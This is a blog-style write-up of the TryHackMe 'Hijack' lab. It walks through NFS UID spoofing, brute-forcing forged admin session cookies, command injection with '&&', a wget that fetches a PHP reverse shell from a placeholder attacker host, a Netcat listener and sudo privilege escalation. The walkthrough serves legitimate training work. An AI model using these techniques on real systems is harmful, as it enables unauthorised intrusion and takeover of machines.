+++
title = 'TryHackMe — Hijack Writeup'
date = '2023-10-21'
draft = false
tags = ["TryHackMe", "Linux"]
summary = '"Misconfigs conquered, identities claimed."'
[cover]
image = 'main.png'
+++

# Nmap

Initial Nmap scanning shows us four open ports:
- **21** — FTP
- **22** — SSH
- **80** — HTTP
- **111** — NFS

{{< figure src="image_1.png" align="center" >}}

# Getting the user flag

Starting off, the webpage has:
- A login page
- A sign up page
- Administration page which can only be accessed by the admin
- A homepage

{{< figure src="image_2.png" align="center" >}}

{{< figure src="image_3.png" align="center" >}}

There is nothing interesting here, except that the login page is improperly configured, through which we find out that the user **admin** exists.

This will come in handy later on.

{{< figure src="image_4.png" align="center" >}}

Brute forcing the login page is a rabbit hole as it implements rate limiting which will lock out an account after 5 incorrect login attempts.

{{< figure src="image_5.png" align="center" >}}

Moving on to **NFS**, we can find the name of the NFS share by running:

```bash
showmount -e <TARGET-IP>
```

{{< figure src="image_6.png" align="center" >}}

Prior to mounting, we need to edit the **fstab** file to specify the mount point and IP.

{{< figure src="image_7.png" align="center" >}}

And then we can create the directory, and mount the share to it.

{{< figure src="image_8.png" align="center" >}}

As you can see, we can’t access the directory, but a user with the UID **1003** will be able to.

{{< figure src="image_9.png" align="center" >}}

So it’s time to create another user.

{{< figure src="image_10.png" align="center" >}}

And we can modify the UID from `/etc/passwd`.

{{< figure src="image_11.png" align="center" >}}

After switching to the user we created, we find a file called `for_employees.txt`, which contains FTP credentials.

{{< figure src="image_12.png" align="center" >}}

Now we can access the machine via FTP and get two files located there:
- `.from_admin.txt`
- `.passwords_list.txt`

{{< figure src="image_13.png" align="center" >}}

{{< figure src="image_14.png" align="center" >}}

The `.from_admin.txt` file reveals a username **rick**, and confirms to us that the user **admin** does in fact use one of the passwords in the `.passwords_list.txt` file.

After messing around with the website, I decided to create an account and login, after which I discovered a **PHPSESSID** in the browser storage.

{{< figure src="image_15.png" align="center" >}}

Plugging this into [CyberChef](https://gchq.github.io/CyberChef/), we discover that it is in the format of `user:password`, and it has been **URL/base64-encoded**.

{{< figure src="image_16.png" align="center" >}}

But what about the password?

Using `hash-identifier`, we discover that it is an MD5 hash.

{{< figure src="image_17.png" align="center" >}}

So, now we have a an idea of how we can leverage these — session hijacking.

I created a short bash script to transform the passwords in the `.passwords_list.txt` file by:
- Hashing each password to MD5
- Then prepending `admin:` to each password

{{< figure src="image_18.png" align="center" >}}

Of course, we won’t be able to manually test each PHPSESSID we have generated, and we also need to encode each PHPSESSID, and this is where BurpSuite comes in handy.

First, let’s capture a request to access the `/administration.php` page.

{{< figure src="image_19.png" align="center" >}}

Then, we load the PHPSESSIDs we generated with the bash script as a payload.

And finally, we add some pre-processors to encode each PHPSESSID.

{{< figure src="image_20.png" align="center" >}}

After a while, we can see that one of the requests returns a response with a different length, and taking a look at the response we see that it worked.

{{< figure src="image_21.png" align="center" >}}

So, we can take that PHPSESSID and replace it in our browser.

Now we get access to the administration panel, through which we can check the status of services running on the machine.

{{< figure src="image_22.png" align="center" >}}

After tinkering with the input for a while, I discovered that we can inject commands by prepending `&&` to our input.
For example:

```bash
&& ls
```

{{< figure src="image_23.png" align="center" >}}

On my machine, I set up a php reverse shell from pentestmonkey: https://pentestmonkey.net/tools/web-shells/php-reverse-shell

Next, I started a Python HTTP server:

```bash
python3 -m http.server
```

And used this command to get the reverse shell onto the target machine:

```bash
wget http://ATTACKER-IP:PORT/php-reverse-shell.php
```

{{< figure src="image_24.png" align="center" >}}

Sanity check to ensure the reverse shell is there:

{{< figure src="image_25.png" align="center" >}}

Next, all we have to do is set up a Netcat listener:

```bash
nc -lvnp <PORT>
```

And visit `/php-reverse-shell.php`.

{{< figure src="image_26.png" align="center" >}}

Before moving on, we need to upgrade our shell to an interactive tty, you can follow this guide: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

After checking out the `/var/www/html` directory, we find the password for the user **rick** in `config.php`.

{{< figure src="image_27.png" align="center" >}}

And after switching to rick, we get the user flag in `/home/rick/user.txt`.

{{< figure src="image_28.png" align="center" >}}

# Getting the root flag

We check what rick can run with sudo:

{{< figure src="image_29.png" align="center" >}}

And after a bit of research, we find this article from HackTricks: https://book.hacktricks.xyz/linux-hardening/privilege-escalation

So, all we have to do to become root is:
- Create the C script on our machine
- Use a Python HTTP server and wget to transfer it to the target machine
- Compile the C file
- And finally, execute it with the command we get from `sudo -l`

{{< figure src="image_30.png" align="center" >}}

And that’s it. The root flag is at `/root/root.txt`.